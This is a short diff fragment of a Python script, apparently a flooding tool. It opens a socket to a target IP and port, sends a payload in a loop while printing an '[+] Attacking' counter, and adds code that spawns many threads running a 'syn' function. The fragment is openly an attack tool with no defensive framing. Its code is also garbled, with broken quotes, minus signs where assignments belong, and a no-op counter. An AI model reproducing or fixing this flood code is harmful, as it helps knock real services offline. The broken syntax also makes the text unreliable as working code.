@@ -37,4 +37,9 @@ h.connect((ip, port)) h.send(hevin) for i in range(packet):
 h.send(hevin)
 bb + 1
 print(colored('[+] Attacking '+ip +">>>Sent: +str(bb), except KeyboardInterrupt:
-h.close() print(colored("[+++] DONE !!!!", "green")) pass 'red'))
+h.close()
+print(colored("[+++] DONE !!!!", "green")) 
+pass 'red'))
+for b in range(thread):
+thread - threading.Thread(target-syn)
+thread.start()
